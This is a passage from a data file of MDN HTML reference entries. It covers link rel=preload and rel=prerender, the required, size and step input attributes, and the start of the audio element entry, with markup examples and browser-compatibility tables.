  description: "# rel=preload\n\nThe `preload` value of the [`<link>`](../../element/link) element's [`rel`](../../element/link#rel) attribute lets you declare fetch requests in the HTML's [`<head>`](../../element/head), specifying resources that your page will need very soon, which you want to start loading early in the page lifecycle, before browsers' main rendering machinery kicks in. This ensures they are available earlier and are less likely to block the page's render, improving performance. Even though the name contains the term *load*, it doesn't load and execute the script but only schedules it to be downloaded and cached with a higher priority.\n\n## The basics\n\nYou most commonly use `<link>` to load a CSS file to style your page with:\n\nhtml\n\n```\n<link rel=\"stylesheet\" href=\"styles/main.css\" />\n```\n\nHere however, we will use a `rel` value of `preload`, which turns `<link>` into a preloader for any resource we want. You will also need to specify:\n\n- The path to the resource in the [`href`](../../element/link#href) attribute.\n- The type of resource in the [`as`](../../element/link#as) attribute.\n\nA simple example might look like this (see our [JS and CSS example source](https://github.com/mdn/html-examples/tree/main/link-rel-preload/js-and-css), and [also live](https://mdn.github.io/html-examples/link-rel-preload/js-and-css/)):\n\nhtml\n\n```\n<head>\n  <meta charset=\"utf-8\" />\n  <title>JS and CSS preload example</title>\n\n  <link rel=\"preload\" href=\"style.css\" as=\"style\" />\n  <link rel=\"preload\" href=\"main.js\" as=\"script\" />\n\n  <link rel=\"stylesheet\" href=\"style.css\" />\n</head>\n\n<body>\n  <h1>bouncing balls</h1>\n  <canvas></canvas>\n\n  <script src=\"main.js\" defer></script>\n</body>\n```\n\nHere we preload our CSS and JavaScript files so they will be available as soon as they are required for the rendering of the page later on. This example is trivial, as the browser probably discovers the `<link rel=\"stylesheet\">` and `<script>` elements in the same chunk of HTML as the preloads, but the benefits can be seen much more clearly the later resources are discovered and the larger they are. For example:\n\n- Resources that are pointed to from inside CSS, like fonts or images.\n- Resources that JavaScript can request, like imported scripts.\n\n`preload` has other advantages too. Using `as` to specify the type of content to be preloaded allows the browser to:\n\n- Store in the cache for future requests, reusing the resource if appropriate.\n- Apply the correct [content security policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to the resource.\n- Set the correct [`Accept`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept) request headers for it.\n\n### What types of content can be preloaded?\n\nMany content types can be preloaded. The possible `as` attribute values are:\n\n- `fetch`: Resource to be accessed by a fetch or XHR request, such as an ArrayBuffer, WebAssembly binary, or JSON file.\n- `font`: Font file.\n- `image`: Image file.\n- `script`: JavaScript file.\n- `style`: CSS stylesheet.\n- `track`: WebVTT file.\n\n**Note:** `font` and `fetch` preloading requires the `crossorigin` attribute to be set; see [CORS-enabled fetches](#cors-enabled_fetches) below.\n\n**Note:** There's more detail about these values and the web features they expect to be consumed by in the HTML spec — see [Link type \"preload\"](https://html.spec.whatwg.org/#match-preload-type). Also note that the full list of values the `as` attribute can take is governed by the Fetch spec — see [request destinations](https://fetch.spec.whatwg.org/#concept-request-destination).\n\n## Including a MIME type\n\n`<link>` elements can accept a [`type`](../../element/link#type) attribute, which contains the MIME type of the resource the element points to. This is especially useful when preloading resources — the browser will use the `type` attribute value to work out if it supports that resource, and will only download it if so, ignoring it if not.\n\nhtml\n\n```\n<head>\n  <meta charset=\"utf-8\" />\n  <title>Image preload example</title>\n\n  <link rel=\"preload\" href=\"flower.avif\" as=\"image\" type=\"image/avif\" />\n</head>\n<body>\n  <picture>\n    <source src=\"flower.avif\" type=\"image/avif\" />\n    <source src=\"flower.webp\" type=\"image/webp\" />\n    <img src=\"flower.jpg\" />\n  </picture>\n</body>\n```\n\nThe code in the example above causes the `image/avif` image to be preloaded only in supporting browsers — and for users who have `image/avif` support in their browsers, causes the `image/avif` image to actually be used (since it's the first [`<source>`](../../element/source) specified). That makes the image download hopefully smaller for users who have `image/avif` support in their browsers.\n\nNote that for users whose browsers have both `image/avif` and `image/webp` support, if in that code a `<link rel=\"preload\" href=\"flower.webp\" as=\"image\" type=\"image/webp\">` element were also specified, then *both* the `image/avif` and `image/webp` images would be preloaded — even though only one of them would actually be used.\n\nTherefore, specifying preloading for multiple types of the same resource is discouraged. Instead, the best practice is to specify preloading only for the type the majority of your users are likely to actually use. That's why the code in the example above doesn't specify preloading for the `image/webp` image.\n\nHowever, the lack of preloading doesn't prevent the `image/webp` image from actually being used by those who need it: for users whose browsers don't have `image/avif` support but do have `image/webp` support, the code in the example above does still cause the `image/webp` image to be used — but it does so without also causing it to also be preloaded unnecessarily for the majority of other users.\n\n## CORS-enabled fetches\n\nWhen preloading resources that are fetched with [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) enabled (e.g. [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/fetch), [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) or [fonts](https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face)), special care needs to be taken to setting the [`crossorigin`](../../element/link#crossorigin) attribute on your [`<link>`](../../element/link) element. The attribute needs to be set to match the resource's CORS and credentials mode, even when the fetch is not cross-origin.\n\nAs mentioned above, one interesting case where this applies is font files. Because of various reasons, these have to be fetched using anonymous-mode CORS (see [Font fetching requirements](https://drafts.csswg.org/css-fonts/#font-fetching-requirements)).\n\nLet's use this case as an example. You can see the full [example source code on GitHub](https://github.com/mdn/html-examples/tree/main/link-rel-preload/fonts) ([also see it live](https://mdn.github.io/html-examples/link-rel-preload/fonts/)):\n\nhtml\n\n```\n<head>\n  <meta charset=\"utf-8\" />\n  <title>Web font example</title>\n\n  <link\n    rel=\"preload\"\n    href=\"fonts/cicle_fina-webfont.woff2\"\n    as=\"font\"\n    type=\"font/woff2\"\n    crossorigin />\n  <link\n    rel=\"preload\"\n    href=\"fonts/zantroke-webfont.woff2\"\n    as=\"font\"\n    type=\"font/woff2\"\n    crossorigin />\n\n  <link href=\"style.css\" rel=\"stylesheet\" />\n</head>\n<body>\n  …\n</body>\n```\n\nNot only are we providing the MIME type hints in the `type` attributes, but we are also providing the `crossorigin` attribute to make sure the preload's CORS mode matches the eventual font resource request.\n\n## Including media\n\nOne nice feature of `<link>` elements is their ability to accept [`media`](../../element/link#media) attributes. These can accept [media types](https://developer.mozilla.org/en-US/docs/Web/CSS/@media#media_types) or full-blown [media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries), allowing you to do responsive preloading!\n\nLet's look at an example (see it on GitHub — [source code](https://github.com/mdn/html-examples/tree/main/link-rel-preload/media), [live example](https://mdn.github.io/html-examples/link-rel-preload/media/)):\n\nhtml\n\n```\n<head>\n  <meta charset=\"utf-8\" />\n  <title>Responsive preload example</title>\n\n  <link\n    rel=\"preload\"\n    href=\"bg-image-narrow.png\"\n    as=\"image\"\n    media=\"(max-width: 600px)\" />\n  <link\n    rel=\"preload\"\n    href=\"bg-image-wide.png\"\n    as=\"image\"\n    media=\"(min-width: 601px)\" />\n\n  <link rel=\"stylesheet\" href=\"main.css\" />\n</head>\n<body>\n  <header>\n    <h1>My site</h1>\n  </header>\n\n  <script>\n    const mediaQueryList = window.matchMedia(\"(max-width: 600px)\");\n    const header = document.querySelector(\"header\");\n\n    if (mediaQueryList.matches) {\n      header.style.backgroundImage = \"url(bg-image-narrow.png)\";\n    } else {\n      header.style.backgroundImage = \"url(bg-image-wide.png)\";\n    }\n  </script>\n</body>\n```\n\nWe include `media` attributes on our `<link>` elements so that a narrow image is preloaded if the user has a narrow viewport, and a wider image is loaded if they have a wide viewport. We use [`Window.matchMedia`](https://developer.mozilla.org/en-US/docs/Web/API/Window/matchMedia) / [`MediaQueryList`](https://developer.mozilla.org/en-US/docs/Web/API/MediaQueryList) to do this (see [Testing media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Testing_media_queries) for more).\n\nThis makes it much more likely that the font will be available for the page render, cutting down on FOUT (flash of unstyled text).\n\nThis doesn't have to be limited to images, or even files of the same type — think big! You could perhaps preload and display a simple SVG diagram if the user is on a narrow screen where bandwidth and CPU is potentially more limited, or preload a complex chunk of JavaScript then use it to render an interactive 3D model if the user's resources are more plentiful.\n\n## Scripting and preloads\n\n**Note:** Use [`<link rel=\"modulepreload\">`](modulepreload) instead if you are working with [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules).\n\nAnother nice thing about these preloads is that you can execute them with script. For example, here we create a [`HTMLLinkElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLLinkElement) instance, then attach it to the DOM:\n\njs\n\n```\nconst preloadLink = document.createElement(\"link\");\npreloadLink.href = \"myscript.js\";\npreloadLink.rel = \"preload\";\npreloadLink.as = \"script\";\ndocument.head.appendChild(preloadLink);\n```\n\nThis means that the browser will preload the `myscript.js` file, but not actually use it yet. To use it, you could do this:\n\njs\n\n```\nconst preloadedScript = document.createElement(\"script\");\npreloadedScript.src = \"myscript.js\";\ndocument.body.appendChild(preloadedScript);\n```\n\nThis is useful when you want to preload a script, but then defer execution until exactly when you need it.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading) for a comparison of `<link rel=\"preload\">` and other similar performance improvement features.\n- [Preload: What Is It Good For?](https://www.smashingmagazine.com/2016/02/preload-what-is-it-good-for/) by Yoav Weiss\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preload](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preload)"
- name: Attributes.rel.prerender
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# rel=prerender\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\n**Non-standard:** This feature is non-standard and is not on a standards track. Do not use it on production sites facing the Web: it will not work for every user. There may also be large incompatibilities between implementations and the behavior may change in the future.\n\nThe `prerender` keyword for the [`rel`](../../element/link#rel) attribute of the [`<link>`](../../element/link) element is a hint to browsers that the user might need the target resource for the next navigation, and therefore the browser can likely improve the user experience by preemptively fetching and processing the resource — for example, by fetching its subresources or performing some rendering in the background offscreen.\n\nThis feature is superceded by the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API).\n\n## Specifications\n\n**No specification found**\n\nNo specification data found for `html.elements.link.rel.prerender`.  \n[Check for problems with this page](#on-github) or contribute a missing `spec_url` to [mdn/browser-compat-data](https://github.com/mdn/browser-compat-data). Also make sure the specification is included in [w3c/browser-specs](https://github.com/w3c/browser-specs).\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `prerender` | 13      | 79   | No      | 15    | No     | 18             | No                  | 14            | No            | 1.5              | 4.4             |     |\n\n## See also\n\n- [Speculative loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Speculative_loading) for a comparison of `<link rel=\"prerender\">` and other similar performance improvement features.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/prerender](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/prerender)"
- name: Attributes.required
  summary: The Boolean required attribute, if present, indicates that the user must specify a value for the input before the owning form can be submitted
  description: "# HTML attribute: required\n\nThe [Boolean](https://developer.mozilla.org/en-US/docs/Glossary/Boolean/HTML) `required` attribute, if present, indicates that the user must specify a value for the input before the owning form can be submitted.\n\nThe `required` attribute is supported by [`text`](../element/input/text), [`search`](../element/input/search), [`url`](../element/input/url), [`tel`](../element/input/tel), [`email`](../element/input/email), [`password`](../element/input/password), [`date`](../element/input/date), [`month`](../element/input/month), [`week`](../element/input/week), [`time`](../element/input/time), [`datetime-local`](../element/input/datetime-local), [`number`](../element/input/number), [`checkbox`](../element/input/checkbox), [`radio`](../element/input/radio), [`file`](../element/input/file), [`<input>`](../element/input) types along with the [`<select>`](../element/select) and [`<textarea>`](../element/textarea) form control elements. If present on any of these input types and elements, the [`:required`](https://developer.mozilla.org/en-US/docs/Web/CSS/:required) pseudo class will match. If the attribute is not included, the [`:optional`](https://developer.mozilla.org/en-US/docs/Web/CSS/:optional) pseudo class will match.\n\nThe attribute is not supported on, or relevant to, [range](../element/input/range) and [color](../element/input/color) input types, as both have default values. Type `color` defaults to `#000000`. Type `range` defaults to the midpoint between `min` and `max` — with `min` and `max` defaulting to 0 and 100 respectively in most browsers if not declared. `required` is also not supported on the [hidden](../element/input/hidden) input type — users cannot be expected to fill out a hidden form field. Finally, `required` is not supported on any button input types, including [image](../element/input/image).\n\nIn the case of a same named group of [radio](../element/input/radio) buttons, if a single radio button in the group has the `required` attribute, a radio button in that group must be checked, although it doesn't have to be the one on which the attribute is applied. To improve code maintenance, it is recommended to either include the `required` attribute in every same-named radio button in the group, or else in none.\n\nIn the case of a same named group of [checkbox](../element/input/checkbox) input types, only the checkboxes with the `required` attribute are required.\n\n**Note:** Setting [`aria-required=\"true\"`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-required) tells a screen reader that an element (any element) is required, but has no bearing on the optionality of the element.\n\n### Attribute interactions\n\nBecause a read-only field cannot be changed, `required` does not have any effect on inputs with the [`readonly`](readonly) attribute also specified.\n\n### Usability\n\nWhen including the `required` attribute, provide a visible indication near the control informing the user that the [`<input>`](../element/input), [`<select>`](../element/select) or [`<textarea>`](../element/textarea) is required. In addition, target required form controls with the [`:required`](https://developer.mozilla.org/en-US/docs/Web/CSS/:required) pseudo-class, styling them in a way to indicate they are required. This improves usability for sighted users. Assistive technology should inform the user that the form control is mandatory based on the required attribute, but adding `aria-required=\"true\"` doesn't hurt, in case the browser / screen reader combination does not support `required` yet.\n\n### Constraint validation\n\nIf the element is required and the element's value is the empty string, then the element is suffering from [`valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing) and the element will match the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) pseudo class.\n\n## Accessibility concerns\n\nProvide an indication to users informing them the form control is required. Ensure the messaging is multi-faceted, such as through text, color, markings, and attribute, so that all users understand the requirements whether they have color blindness, cognitive differences, or are using a screen reader.\n\n## Example\n\n### HTML\n\nhtml\n\n```\n<form>\n  <div class=\"group\">\n    <input type=\"text\" />\n    <label>Normal</label>\n  </div>\n  <div class=\"group\">\n    <input type=\"text\" required />\n    <label>Required</label>\n  </div>\n  <input type=\"submit\" />\n</form>\n```\n\n### Result\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `required` | 4       | 12   | 4       | ≤12.1 | 5      | 18             | 4                   | ≤12.1         | 5             | 1.0              | ≤37             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `required` | 10      | 12   | 4       | 15    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `required` | 4       | 12   | 4       | ≤12.1 | 5      | 18             | 4                   | ≤12.1         | 4             | 1.0              | ≤37             |     |\n\n### html.elements.input.required\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.select.required\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.required\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`validityState.valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing)\n- [`:required`](https://developer.mozilla.org/en-US/docs/Web/CSS/:required) and [`:optional`](https://developer.mozilla.org/en-US/docs/Web/CSS/:optional)\n- [`<input>`](../element/input)\n- [`<select>`](../element/select)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/required](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/required)"
- name: Attributes.size
  summary: The size attribute defines the width of the <input> and the height of the <select> element
  description: "# HTML attribute: size\n\nThe `size` attribute defines the width of the [`<input>`](../element/input) and the height of the [`<select>`](../element/select) element. For an `input` element, it defines the number of characters that the user agent allows the user to see when editing the value. For a `select` element, it defines the number of options that should be shown to the user. This must be a valid non-negative integer greater than zero.\n\nIf no `size` is specified, or an invalid value is specified, the input has no size declared, and the form control will be the default width based on the user agent. If CSS targets the element with properties impacting the width, CSS takes precedence.\n\nThe `size` attribute has no impact on constraint validation.\n\n## Try it\n\n#### HTML Demo: size\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"firstName\">First Name:</label>\n    <input id=\"firstName\" name=\"firstName\" type=\"text\" size=\"10\" />\n\n    <label for=\"lastName\">Last Name:</label>\n    <input id=\"lastName\" name=\"lastName\" type=\"text\" size=\"20\" />\n\n    <label for=\"fruit\">Favourite fruit:</label>\n    <select id=\"fruit\" name=\"fruit\" size=\"2\">\n      <option>Orange</option>\n      <option>Banana</option>\n      <option>Apple</option>\n    </select>\n\n    label {\n      display: block;\n      margin-top: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Examples\n\nBy adding `size` on some input types, the width of the input can be controlled. Adding size on a select changes the height, defining how many options are visible in the closed state.\n\nhtml\n\n```\n<label for=\"fruit\">Enter a fruit</label>\n<input type=\"text\" size=\"15\" id=\"fruit\" />\n<label for=\"vegetable\">Enter a vegetable</label>\n<input type=\"text\" id=\"vegetable\" />\n\n<select name=\"fruits\" size=\"5\">\n  <option>banana</option>\n  <option>cherry</option>\n  <option>strawberry</option>\n  <option>durian</option>\n  <option>blueberry</option>\n</select>\n\n<select name=\"vegetables\" size=\"5\">\n  <option>carrot</option>\n  <option>cucumber</option>\n  <option>cauliflower</option>\n  <option>celery</option>\n  <option>collard greens</option>\n</select>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `size` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `size` | 1       | 12   | 1       | 15    | 3      | No             | 4                   | No            | No            | No               | No              |     |\n\n### html.elements.select.size\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.input.size\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`maxlength`](maxlength)\n- [`minlength`](minlength)\n- [`pattern`](pattern)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/size](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/size)"
- name: Attributes.step
  summary: The step attribute is a number that specifies the granularity that the value must adhere to or the keyword any
  description: "# HTML attribute: step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to or the keyword `any`. It is valid for the numeric input types, including the [date](../element/input/date), [month](../element/input/month), [week](../element/input/week), [time](../element/input/time), [datetime-local](../element/input/datetime-local), [number](../element/input/number) and [range](../element/input/range) types.\n\nThe `step` sets the *stepping interval* when clicking up and down spinner buttons, moving a slider left and right on a range, and validating the different date types. If not explicitly included, `step` defaults to 1 for `number` and `range`, and 1 unit type (minute, week, month, day) for the date/time input types. The value must be a positive number - integer or float — or the special value `any`, which means no stepping is implied and any value is allowed (barring other constraints, such as [`min`](min) and [`max`](max)).\n\nThe default stepping value for `number` inputs is 1, allowing only integers to be entered, *unless* the stepping base is not an integer. The default stepping value for `time` is 60 seconds, with 900 being equal to 15 minutes.\n\n## Syntax\n\n| Input type                                        | Value        | Example                                                           |\n|---------------------------------------------------|--------------|-------------------------------------------------------------------|\n| [date](../element/input/date)                     | 1 (day)      | `<input type=\"date\" min=\"2019-12-25\" step=\"1\">`                   |\n| [month](../element/input/month)                   | 1 (month)    | `<input type=\"month\" min=\"2019-12\" step=\"12\">`                    |\n| [week](../element/input/week)                     | 1 (week)     | `<input type=\"week\" min=\"2019-W23\" step=\"2\">`                     |\n| [time](../element/input/time)                     | 60 (seconds) | `<input type=\"time\" min=\"09:00\" step=\"900\">`                      |\n| [datetime-local](../element/input/datetime-local) | 60 (seconds) | `<input type=\"datetime-local\" min=\"2019-12-25T19:30\" step=\"900\">` |\n| [number](../element/input/number)                 | 1            | `<input type=\"number\" min=\"0\" step=\"0.1\" max=\"10\">`               |\n| [range](../element/input/range)                   | 1            | `<input type=\"range\" min=\"0\" step=\"2\" max=\"10\">`                  |\n\nDefault values for step\n\nIf `any` is not explicitly set, valid values for the `number`, date/time input types, and `range` input types are equal to the basis for stepping - the [`min`](min) value and increments of the step value, up to the [`max`](max) value, if specified. The following example results in any even integer, 10 or greater, being valid:\n\nhtml\n\n```\n<input type=\"number\" min=\"10\" step=\"2\" />\n```\n\nIf `step` is omitted, any integer is valid but floats like 4.2 are not valid as `step` defaults to 1. For 4.2 to be valid:\n\n- either `step` would have to be set to `any`, 0.1, or 0.2,\n- or the `min` value would have to be a number ending in .2, such as 0.2, 1.2, or -5.2.\n\n## Examples\n\n### `min` impact on step\n\nThe value of `min` defines valid values, even if the `step` attribute is not included. This is because `step` defaults to `1` for the `number` input type.\n\nIn this example, we add a big red border around invalid inputs:\n\ncss\n\n```\ninput:invalid {\n  border: solid red 3px;\n}\n```\n\nWe then define an input with a minimum value of 1.2 and a step value of 2:\n\nhtml\n\n```\n<input id=\"myNumber\" name=\"myNumber\" type=\"number\" step=\"2\" min=\"1.2\" />\n```\n\nValid values include 1.2, 3.2, 5.2, 7.2, 9.2, 11.2, and so on. Only floats with an odd-numbered integer part and a decimal part of .2 are valid. The number spinner, if present, generates valid float values of 1.2 and greater, in increments of 2.\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the value is considered invalid in constraint validation and will match the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) and [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range) pseudoclasses.\n\nSee [Client-side validation](../constraint_validation) and [`stepMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/stepMismatch) for more information.\n\n## Accessibility concerns\n\nProvide instructions to help users understand how to complete the form and use individual form controls. Indicate any required and optional input, data formats, and other relevant information. When using the `min` attribute, ensure this minimum requirement is understood by the user. Providing instructions within the [`<label>`](../element/label) may be sufficient. If providing instructions outside of labels, which allows more flexible positioning and design, consider using [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) or [`aria-describedby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-describedby).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `step` | 5       | 12   | 16      | ≤12.1 | 5      | 18             | 16                  | ≤12.1         | 4             | 1.0              | ≤37             |     |\n\n## See also\n\n- [`max`](max)\n- [`min`](min)\n- [Constraint validation](../constraint_validation)\n- [Form validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [`validityState.stepMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/stepMismatch)\n- [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range)\n- [`<input>`](../element/input)\n- [date](../element/input/date), [month](../element/input/month), [week](../element/input/week), [time](../element/input/time), [datetime-local](../element/input/datetime-local), [number](../element/input/number) and [range](../element/input/range) types, and the [`<meter>`](../element/meter)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/step](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/step)"
- name: audio
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<audio\\>: The Embed Audio element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Faudio&level=high)\n\nThe `<audio>` [HTML](../index) element is used to embed sound content in documents. It may contain one or more audio sources, represented using the `src` attribute or the [`<source>`](source) element: the browser will choose the most suitable one. It can also be the destination for streamed media, using a [`MediaStream`](https://developer.mozilla.org/en-US/docs/Web/API/MediaStream).\n\n## Try it\n\n#### HTML Demo: \\<audio\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <figure>\n      <figcaption>Listen to the T-Rex:</figcaption>\n      <audio controls src=\"/media/cc0-audio/t-rex-roar.mp3\"></audio>\n      <a href=\"/media/cc0-audio/t-rex-roar.mp3\"> Download audio </a>\n    </figure>\n\n    figure {\n      margin: 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe above example shows simple usage of the `<audio>` element. In a similar manner to the [`<img>`](img) element, we include a path to the media we want to embed inside the `src` attribute; we can include other attributes to specify information such as whether we want it to autoplay and loop, whether we want to show the browser's default audio controls, etc.\n\nThe content inside the opening and closing `<audio></audio>` tags is shown as a fallback in browsers that don't support the element.\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`autoplay`](#autoplay)  \nA Boolean attribute: if specified, the audio will automatically begin playback as soon as it can do so, without waiting for the entire audio file to finish downloading.\n\n**Note:** Sites that automatically play audio (or videos with an audio track) can be an unpleasant experience for users, so should be avoided when possible. If you must offer autoplay functionality, you should make it opt-in (requiring a user to specifically enable it). However, this can be useful when creating media elements whose source will be set at a later time, under user control. See our [autoplay guide](https://developer.mozilla.org/en-US/docs/Web/Media/Autoplay_guide) for additional information about how to properly use autoplay.\n\n[`controls`](#controls)  \nIf this attribute is present, the browser will offer controls to allow the user to control audio playback, including volume, seeking, and pause/resume playback.\n\n[`controlslist`](#controlslist)  \nThe [`controlslist`](https://wicg.github.io/controls-list/explainer.html) attribute, when specified, helps the browser select what controls to show for the `audio` element whenever the browser shows its own set of controls (that is, when the `controls` attribute is specified).\n\nThe allowed values are `nodownload`, `nofullscreen` and `noremoteplayback`.\n\n[`crossorigin`](../attributes/crossorigin)  \nThis [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute indicates whether to use CORS to fetch the related audio file. [CORS-enabled resources](../cors_enabled_image) can be reused in the [`<canvas>`](canvas) element without being *tainted*. The allowed values are:\n\n[`anonymous`](#anonymous)  \nSends a cross-origin request without a credential. In other words, it sends the `Origin:` HTTP header without a cookie, X.509 certificate, or performing HTTP Basic authentication. If the server does not give credentials to the origin site (by not setting the `Access-Control-Allow-Origin:` HTTP header), the resource will be *tainted*, and its usage restricted.\n\n[`use-credentials`](#use-credentials)  \nSends a cross-origin request with a credential. In other words, it sends the `Origin:` HTTP header with a cookie, a certificate, or performing HTTP Basic authentication. If the server does not give credentials to the origin site (through `Access-Control-Allow-Credentials:` HTTP header), the resource will be *tainted* and its usage restricted.\n\nWhen not present, the resource is fetched without a CORS request (i.e. without sending the `Origin:` HTTP header), preventing its non-tainted use in [`<canvas>`](canvas) elements. If invalid, it is handled as if the enumerated keyword **anonymous** was used. See [CORS settings attributes](../attributes/crossorigin) for additional 